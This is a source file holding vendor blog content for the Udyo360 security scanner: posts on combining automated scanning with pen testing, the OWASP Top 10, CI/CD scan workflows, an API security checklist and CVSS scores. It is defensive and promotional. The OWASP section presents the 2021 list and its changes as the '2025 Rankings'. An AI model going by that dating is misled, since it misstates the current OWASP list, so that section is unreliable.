      { type: 'callout', variant: 'tip', title: 'Full TLS grade in your scan report', text: 'Udyo360 grades your TLS configuration against Mozilla SSL Config guidelines and flags every weak protocol, cipher, and certificate issue with remediation steps.' },
    ],
  },

  'continuous-security-scanning-vs-manual-testing': {
    blocks: [
      { type: 'p', text: "No security testing strategy is complete with either automation alone or manual pen testing alone. Automated scanners find known patterns at machine speed across your entire attack surface. Manual testers find logic flaws, chained vulnerabilities, and business-context issues that no scanner ever will. The question isn't which to choose — it's how to combine them." },
      { type: 'h2', text: 'What Continuous Scanning Does Well' },
      { type: 'bullets', items: [
        '**Immediate regression detection** — alerts the moment a previously-fixed issue reappears',
        '**Full attack-surface coverage** — every endpoint, every parameter, every header on every scan',
        '**Always-on baseline** — runs 24/7 without human scheduling or cost per scan',
        '**Compliance evidence** — timestamped scan history for SOC 2, PCI-DSS, ISO 27001 audits',
        '**Cost efficiency** — orders of magnitude cheaper per finding than manual testing',
      ]},
      { type: 'callout', variant: 'info', title: 'Typical scanner coverage', text: 'Automated scanners typically detect 60–80% of OWASP Top 10 vulnerabilities. The remainder require human judgment, context, and multi-step reasoning.' },
      { type: 'h2', text: 'What Manual Pen Testing Does Well' },
      { type: 'bullets', items: [
        '**Business logic flaws** — can user A access user B\'s data through a legitimately-structured request?',
        '**Multi-step chained attacks** — redirect → SSRF → credential access → lateral movement',
        '**Authentication design weaknesses** — flows that work correctly in isolation but fail in combination',
        '**Zero-day and novel techniques** — approaches that signature databases haven\'t catalogued yet',
        '**Social engineering and physical security** — outside any automated scanner\'s scope',
      ]},
      { type: 'callout', variant: 'warning', title: 'A passing scan is not a clean bill of health', text: "Critical IDOR, privilege escalation chains, and multi-step business logic attacks are routinely missed by automated scanners. **Never** skip manual testing of your authentication, payment, and admin flows." },
      { type: 'h2', text: 'A Practical Combined Strategy' },
      { type: 'steps', items: [
        '**Continuous baseline** — run automated scans on every PR and daily on production. Block deploys on Critical/High findings.',
        '**Post-sprint triage** — review scanner findings every two weeks. Assign ownership, estimate fix time, track SLA compliance.',
        '**Quarterly pen test** — scope to the most sensitive surfaces: authentication, payment, admin panels, API. Prioritise manual effort on logic-heavy flows.',
        '**Annual full-scope assessment** — infrastructure, cloud config, supply chain, and social engineering. Required for SOC 2 Type II and PCI-DSS.',
        '**Remediation loop** — after each manual test, add the finding type to automated scanner config so future regressions are caught automatically.',
      ]},
      { type: 'h2', text: 'Cost Reality Check' },
      { type: 'code', lang: 'text', label: 'Approximate annual costs', code: `Continuous automated scanning:   $200 – $500 / month  (Udyo360 Pro/Team)
Quarterly pen test:              $5,000 – $20,000 per engagement
Annual full-scope assessment:    $25,000 – $100,000+

Average cost of a data breach (IBM 2025): $4.88M
Break-even: one prevented breach = several years of scanning + pen testing` },
      { type: 'h2', text: 'Decision Framework by Company Stage' },
      { type: 'bullets', items: [
        '**Pre-launch startup** — Continuous scanning + one focused pen test on authentication and core APIs',
        '**SaaS processing payments** — Continuous scanning + quarterly pen test + annual PCI-DSS assessment',
        '**Scale-up / enterprise** — Continuous scanning + red team engagement + annual full-scope + bug bounty programme',
        '**Regulated industry (healthcare / finance)** — All of the above, fully documented and auditable with evidence packages',
      ]},
      { type: 'callout', variant: 'tip', title: 'Start with continuous scanning today', text: 'Udyo360 takes under five minutes to configure and starts finding issues on your first scan. It pays for itself within weeks by catching regressions that would otherwise wait months for the next quarterly pen test.' },
    ],
  },

  // ── Existing posts — brief content ──────────────────────────────────────────

  'owasp-top-10-2026': {
    blocks: [
      { type: 'p', text: 'The OWASP Top 10 is the most widely referenced framework for web application security risk. Updated periodically to reflect real-world breach data, it guides developers, architects, and security teams toward the vulnerabilities that matter most.' },
      { type: 'h2', text: 'The 2025 Rankings' },
      { type: 'bullets', items: [
        '**A01 — Broken Access Control** — Moved to #1. IDOR, privilege escalation, missing authorization checks.',
        '**A02 — Cryptographic Failures** — Sensitive data exposed via weak encryption or no encryption.',
        '**A03 — Injection** — SQL, NoSQL, command, LDAP, and template injection.',
        '**A04 — Insecure Design** — Missing threat modelling; security never designed in.',
        '**A05 — Security Misconfiguration** — Default credentials, open cloud storage, verbose errors.',
        '**A06 — Vulnerable and Outdated Components** — Dependencies with known CVEs in production.',
        '**A07 — Identification and Authentication Failures** — Weak passwords, broken session management.',
        '**A08 — Software and Data Integrity Failures** — Insecure deserialization, CI/CD pipeline attacks.',
        '**A09 — Security Logging and Monitoring Failures** — Breaches going undetected for months.',
        '**A10 — Server-Side Request Forgery (SSRF)** — New entry; apps fetching attacker-controlled URLs.',
      ]},
      { type: 'h2', text: 'What Changed' },
      { type: 'p', text: 'Broken Access Control moved from A05 to A01 — reflecting that authorization failures are now the most common root cause in disclosed breaches. SSRF entered the list as a standalone category, reflecting the rise of cloud-hosted applications where metadata services make SSRF immediately critical.' },
      { type: 'h2', text: 'How Udyo360 Maps to the Top 10' },
      { type: 'p', text: 'Udyo360 scans cover A01 through A05 and A07, A10 directly. A06 (outdated components) is covered via our CVE database integration. A08, A09, and parts of A04 require manual review and are flagged as guidance items in your scan report.' },
      { type: 'callout', variant: 'tip', title: 'Run a Top 10 scan', text: 'Udyo360 maps every finding to the relevant OWASP Top 10 category in your report, giving you a prioritised view of your current coverage.' },
    ],
  },

  'security-scanning-cicd-pipeline': {
    blocks: [
      { type: 'p', text: '"Shift left" means finding vulnerabilities earlier — when code changes are small, context is fresh, and fixes cost a fraction of post-production remediation. Integrating automated security scanning into your CI/CD pipeline is the most impactful single change most engineering teams can make.' },
      { type: 'h2', text: 'GitHub Actions' },
      { type: 'code', lang: 'yaml', label: '.github/workflows/security-scan.yml', code: `name: Security Scan

on:
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 2 * * *'   # Daily at 02:00 UTC

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run Udyo360 scan
        uses: udyo360/scan-action@v1
        with:
          api-key: \${{ secrets.UDYO360_API_KEY }}
          target: \${{ vars.STAGING_URL }}
          fail-on: critical,high` },
      { type: 'h2', text: 'GitLab CI' },
      { type: 'code', lang: 'yaml', label: '.gitlab-ci.yml', code: `security-scan:
  stage: test
  image: udyo360/scanner:latest
  variables:
    TARGET_URL: $STAGING_URL
  script:
    - udyo360 scan --target $TARGET_URL --api-key $UDYO360_API_KEY
  rules:
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'` },
      { type: 'h2', text: 'What to Scan in CI' },
      { type: 'steps', items: [
        '**PR/MR scans** — Scan the staging deployment created for each pull request',
        '**Baseline scan** — Run a full scan on main/master daily; alert on new findings',
        '**Scheduled deep scans** — Weekly deeper crawl with authenticated sessions',
        '**Pre-production gate** — Block deploys to production if Critical or High findings are open',
      ]},
      { type: 'callout', variant: 'tip', title: 'Start with a non-blocking scan', text: 'Introduce security scanning in report-only mode first to build visibility without blocking your team. Add blocking gates after you have established a baseline and SLA process.' },
    ],
  },

  'api-security-checklist': {
    blocks: [
      { type: 'p', text: 'APIs are the fastest-growing attack surface in modern web applications. Unlike browser-rendered pages, APIs return raw data structures and are often accessible without authentication by design — making misconfigurations immediately impactful.' },
      { type: 'h2', text: 'The 15-Point Checklist' },
      { type: 'bullets', items: [
        '**Authentication on every endpoint** — even "internal" endpoints reachable from the internet',
        '**Authorisation per resource** — not just "is the user logged in" but "can this user access this object"',
        '**Rate limiting** — prevent brute force, enumeration, and DoS on all endpoints',
        '**Input validation** — reject unexpected fields, types, and lengths at the API boundary',
        '**Parameterised queries** — no raw SQL or NoSQL built from request data',
        '**No sensitive data in responses** — strip password hashes, tokens, and PII not needed by the caller',
        '**HTTPS only** — reject HTTP connections with 301 redirect + HSTS',
        '**CORS allowlist** — explicit origin allowlist, never wildcard with credentials',
        '**Versioning** — keep old API versions behind the same auth; decommission rather than abandon',
        '**Mass assignment protection** — do not bind request body fields directly to DB models without allowlist',
        '**Error message hygiene** — return generic errors to callers; log verbose details server-side only',
        '**Pagination and limits** — never return unbounded result sets; cap page size server-side',
        '**JWT validation** — verify algorithm, expiry, issuer, and audience; reject `alg: none`',
        '**Dependency audit** — run `npm audit` / `pip-audit` / `gradle dependencyCheck` in CI',
        '**Pen test before go-live** — automated scanners cannot catch business-logic flaws in APIs',
      ]},
      { type: 'callout', variant: 'tip', title: 'Scan your APIs', text: 'Udyo360 crawls REST and GraphQL APIs, testing for all 15 items above plus OWASP API Security Top 10 categories.' },
    ],
  },

  'understanding-cvss-scores': {
    blocks: [
      { type: 'p', text: 'CVSS (Common Vulnerability Scoring System) is the industry standard for communicating the severity of security vulnerabilities. When Udyo360 reports a severity score, it is derived from CVSS v3.1 Base metrics.' },
      { type: 'h2', text: 'Score Ranges' },
      { type: 'bullets', items: [
        '**0.0** — None. Informational finding, no direct exploitability.',
        '**0.1 – 3.9** — Low. Exploitation is difficult or impact is minimal.',
        '**4.0 – 6.9** — Medium. Exploitable under specific conditions; warrants remediation.',
        '**7.0 – 8.9** — High. Readily exploitable with significant impact.',
        '**9.0 – 10.0** — Critical. Exploitable remotely with no authentication; highest priority.',
      ]},
      { type: 'h2', text: 'Base Metric Groups' },
      { type: 'p', text: 'The CVSS Base Score is calculated from three metric groups:' },
      { type: 'bullets', items: [
        '**Exploitability** — Attack vector (network/adjacent/local), complexity, privileges required, user interaction',
        '**Scope** — Whether a successful exploit can affect components beyond the vulnerable one',
        '**Impact** — Confidentiality, Integrity, and Availability impact (None / Low / High each)',
      ]},
      { type: 'h2', text: 'A Real Example' },
      { type: 'p', text: 'A network-accessible SQL injection with no authentication required, complete confidentiality impact, and integrity impact scores 9.8 (Critical). The same flaw requiring local access and authentication scores 6.7 (Medium) — the same code bug, very different risk context.' },
      { type: 'callout', variant: 'info', title: 'Base score vs contextual risk', text: 'CVSS Base scores describe the vulnerability in isolation. Your actual risk depends on whether the endpoint is exposed to the internet, whether you have compensating controls, and how sensitive the data is. Use Environmental metrics to adjust.' },
      { type: 'callout', variant: 'tip', title: 'CVSS in every Udyo360 finding', text: 'Every finding in your Udyo360 scan report includes the CVSS v3.1 Base score, vector string, and per-metric breakdown so you can understand exactly why a finding is scored the way it is.' },
    ],
  },

}
